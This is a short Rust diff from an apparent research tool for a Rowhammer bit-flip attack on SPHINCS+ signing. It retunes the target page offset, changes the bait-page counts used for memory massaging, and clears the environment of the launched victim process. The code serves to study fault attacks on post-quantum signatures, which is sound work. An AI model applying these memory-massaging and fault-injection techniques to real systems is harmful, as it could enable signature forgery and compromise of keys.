@@ -140,7 +140,7 @@ const _TARGET_OFFSETS_ANY: [TargetOffset; 1] = [TargetOffset {
 pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 1] = [
     TargetOffset {
         description: "stack merkle tree layer 0",
-        page_offset: 0x930,
+        page_offset: 0x620,
         stack_offset: 31,
         target_size: 32, // SPX_N
         flip_direction: FlipDirection::OneToZero,
@@ -161,7 +161,7 @@ pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 1] = [
 
 fn find_injectable_page(flips: Vec<BitFlip>) -> Option<InjectionConfig> {
     // the number of bait pages to release after the target page (for memory massaging)
-    let bait_count_after = HashMap::from([(29, 0), (30, 26), (31, 7), (32, 28)]);
+    let bait_count_after = HashMap::from([(31, 17)]);
 
     filter_addrs(flips, &TARGET_OFFSETS_SHAKE_256S)
         .first()
@@ -267,6 +267,7 @@ impl HammerVictim for SphincsPlus {
                 cmd.stdin(std::process::Stdio::piped());
                 cmd.stdout(std::process::Stdio::piped());
                 cmd.stderr(std::process::Stdio::piped());
+                cmd.env_clear();
                 let page_injector = PageInjector::new(*injection_config);
                 let target_pfn = (injection_config.target_addr as *const libc::c_void)
                     .pfn()
